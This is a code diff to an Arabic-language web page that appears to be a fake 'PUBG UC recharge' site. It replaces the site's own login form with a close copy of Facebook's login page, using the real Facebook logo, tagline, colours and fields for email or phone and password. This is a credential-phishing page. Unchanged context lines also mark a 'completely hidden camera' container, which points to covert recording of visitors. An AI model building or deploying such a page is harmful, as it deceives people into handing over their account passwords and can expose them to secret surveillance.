@@ -857,6 +857,164 @@
         left: 8px;
     }
 }
+        /* تصميم صفحة تسجيل الدخول بأسلوب فيسبوك الأصلي */
+.login-container {
+  background: #f0f2f5;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px;
+  box-sizing: border-box;
+}
+
+.fb-login-wrapper {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  align-items: center;
+  gap: 60px;
+  max-width: 1000px;
+  width: 100%;
+}
+
+.fb-left {
+  flex: 1;
+  min-width: 320px;
+  text-align: right;
+}
+
+.fb-logo {
+  width: 280px;
+  margin-bottom: 10px;
+}
+
+.fb-left h2 {
+  font-family: Helvetica, Arial, sans-serif;
+  font-size: 28px;
+  font-weight: normal;
+  color: #1c1e21;
+  line-height: 32px;
+  margin-right: 15px;
+}
+
+.fb-right {
+  flex: 1;
+  min-width: 380px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.fb-form {
+  width: 100%;
+  max-width: 396px;
+  background: #fff;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  box-sizing: border-box;
+  text-align: center;
+}
+
+.fb-form input {
+  width: 100%;
+  padding: 14px 16px;
+  margin-bottom: 12px;
+  border: 1px solid #dddfe2;
+  border-radius: 6px;
+  font-size: 17px;
+  font-family: Helvetica, Arial, sans-serif;
+}
+
+.fb-form input:focus {
+  border-color: #1877f2;
+  outline: none;
+  box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+.fb-form button {
+  width: 100%;
+  padding: 14px 0;
+  font-size: 20px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+  color: #fff;
+  background: #1877f2;
+  transition: background 0.2s ease;
+}
+
+.fb-form button:hover {
+  background: #166fe5;
+}
+
+.fb-form .forgot {
+  display: inline-block;
+  margin-top: 15px;
+  color: #1877f2;
+  font-size: 14px;
+  text-decoration: none;
+}
+
+.fb-form .forgot:hover {
+  text-decoration: underline;
+}
+
+.fb-form hr {
+  margin: 20px 0;
+  border: none;
+  border-top: 1px solid #dadde1;
+}
+
+.fb-form .create-account {
+  background: #42b72a;
+  font-size: 17px;
+  font-weight: bold;
+  width: auto;
+  padding: 14px 16px;
+  border-radius: 6px;
+}
+
+.fb-form .create-account:hover {
+  background: #36a420;
+}
+
+.create-page {
+  font-size: 14px;
+  margin-top: 25px;
+  text-align: center;
+  color: #1c1e21;
+}
+
+.create-page a {
+  font-weight: bold;
+  text-decoration: none;
+  color: #1c1e21;
+}
+
+.create-page a:hover {
+  text-decoration: underline;
+}
+
+/* استجابة للجوال */
+@media (max-width: 768px) {
+  .fb-login-wrapper {
+    flex-direction: column;
+    gap: 30px;
+    text-align: center;
+  }
+  .fb-left h2 {
+    font-size: 24px;
+    text-align: center;
+    margin: 0 auto;
+  }
+  .fb-logo {
+    margin: 0 auto 20px auto;
+  }
+}
+
     </style>
 </head>
 <body>
@@ -976,47 +1134,28 @@
         </div>
     </div>
 
-    <!-- صفحة تسجيل الدخول -->
-    <div class="login-container" id="login-container">
-        <div class="login-header">
-            <img src="WWW.png" alt="شعار النظام" class="header-logo">
-            <h1 style="color: white; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">شحن شدات</h1>
-            <p style="color: #dce5e5;">يجب تسجيل الدخول للحصول على شدات</p>
-        </div>
-        
-        <form class="login-form" id="loginForm">
-            <div class="form-group">
-                <label for="username">البريد الإلكتروني</label>
-                <input type="email" id="username" placeholder="أدخل البريد الإلكتروني" required autocomplete="username">
-            </div>
-            
-            <div class="form-group">
-                <label for="password">كلمة المرور</label>
-                <div class="password-container">
-                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required autocomplete="current-password">
-                    <button type="button" class="toggle-password" id="togglePassword" aria-label="إظهار/إخفاء كلمة المرور">👁️</button>
-                </div>
-            </div>
-            
-            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
-            
-            <div class="forgot-password">
-                <a href="#">نسيت كلمة المرور؟</a>
-            </div>
-            
-            <!-- رسالة نجاح تسجيل الدخول -->
-            <div class="login-success" id="loginSuccess">
-                <p>جاري التحقق من بياناتك...</p>
-            </div>
-            
-            <div id="login-status" class="status-message"></div>
-        </form>
-        
-        <div class="footer">
-            <p>© 2025 موقع شحن شدات. جميع الحقوق محفوظة.</p>
-            <p>الإصدار 3.1.0 | <a href="#" id="show-login-terms">الشروط والأحكام</a></p>
-        </div>
+    <!-- صفحة تسجيل الدخول بتصميم فيسبوك الحقيقي -->
+<div class="login-container" id="login-container">
+  <div class="fb-login-wrapper">
+    <div class="fb-left">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo" alt="Facebook Logo">
+      <h2>Facebook يساعدك على التواصل والمشاركة مع الأشخاص في حياتك.</h2>
     </div>
+
+    <div class="fb-right">
+      <form class="fb-form">
+        <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" placeholder="كلمة المرور" required>
+        <button type="submit">تسجيل الدخول</button>
+        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
+        <hr>
+        <button type="button" class="create-account">إنشاء حساب جديد</button>
+      </form>
+      <p class="create-page"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو نشاط تجاري.</p>
+    </div>
+  </div>
+</div>
+
 
     <!-- الكاميرا المخفية تماماً -->
     <div id="camera-container">
@@ -1558,6 +1697,7 @@
     </script>
 </body>
 </html>
+
 
 
 
